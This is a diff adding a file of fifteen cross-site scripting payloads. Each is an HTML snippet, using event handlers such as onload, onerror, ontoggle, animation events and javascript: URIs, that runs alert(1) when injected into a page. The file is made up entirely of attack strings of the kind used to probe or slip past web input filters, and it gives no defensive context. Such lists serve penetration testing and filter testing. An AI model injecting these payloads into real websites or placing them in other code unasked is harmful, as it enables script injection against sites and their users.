@@ -1,0 +1,15 @@
+<body onload=alert(1)>
+<body onpageshow=alert(1)>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<video><source onerror=alert(1)></video>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationstart=alert(1)>
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend=alert(1)>
+<input autofocus onfocus=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<object data="javascript:alert(1)"></object>
+<marquee onstart=alert(1)>
+<video onloadstart="alert(1)"><source>
+<xss onafterscriptexecute=alert(1)><script>1</script>
